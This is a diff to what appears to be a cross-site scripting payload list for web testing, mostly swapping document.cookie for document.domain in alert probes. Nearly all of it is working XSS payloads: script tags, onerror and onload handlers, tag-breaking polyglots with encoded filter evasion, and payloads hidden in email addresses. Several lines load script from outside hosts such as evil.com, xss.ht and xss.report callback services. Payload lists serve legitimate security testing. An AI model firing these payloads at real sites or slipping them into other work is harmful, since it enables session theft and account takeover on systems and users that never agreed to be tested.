@@ -11,7 +11,7 @@
 
 <script>alert(document.cookie)%0d%0a-->%09</script
 
-' accesskey=X onclick=alert(document.cookie) '
+' accesskey=X onclick=alert(document.domain) '
 
 ' onmouseover=alert(document.cookie) '
 
@@ -26,22 +26,22 @@
 
 '"; alert("XSS attack!"); //';
 
-<img src=x onerror=alert(document.cookie)>
-'-alert(document.cookie)-';"-alert(document.cookie)-"//"><svg/onload=alert(document.cookie)>
-<img src=totallyfake onerror=alert(document.cookie);//
+<img src=x onerror=alert(document.domain)>
+'-alert(document.cookie)-';"-alert(document.domain)-"//"><svg/onload=alert(document.cookie)>
+<img src=totallyfake onerror=alert(document.domain);//
 <img src=x onerror=import(‘//evil.com/‘);//
-'"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`document.cookie`>%22%3E%3CSvg/onload=confirm`document.cookie`//<Script/src=//ChiragXSS.xSs.ht></scripT>
+'"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`document.domain`>%22%3E%3CSvg/onload=confirm`document.cookie`//<Script/src=//ChiragXSS.xSs.ht></scripT>
 
 
-“><svg/onload=confirm(1)>”@gmail.com
-<svg onload=location='javascript:alert(document.cookie)'>
-"<script>alert(document.cookie)</script>"@gmail.com
+“><svg/onload=confirm(document.domain)>”@gmail.com
+<svg onload=location='javascript:alert(document.domain)'>
+"<script>alert(document.domain)</script>"@gmail.com
 "><--<img+src= "><svg/onload+alert(document.domain)>> --!>
 '"></title></textarea></script></style></noscript><script src=abc.xss.ht></script>
 
-test+(<script>alert(document.cookie)</script>)@gmail.com
-"\/><img%20s+src+c=x%20on+onerror+%20="alert(document.cookie)"\>
-"><svg+svg+svg\/\/On+OnLoAd=confirm(document.cookie)>
+test+(<script>alert(document.domain)</script>)@gmail.com
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(document.domain)"\>
+"><svg+svg+svg\/\/On+OnLoAd=confirm(document.domain)>
 
 
 '"><script src=//xss.report/s/Ax01sec></script>
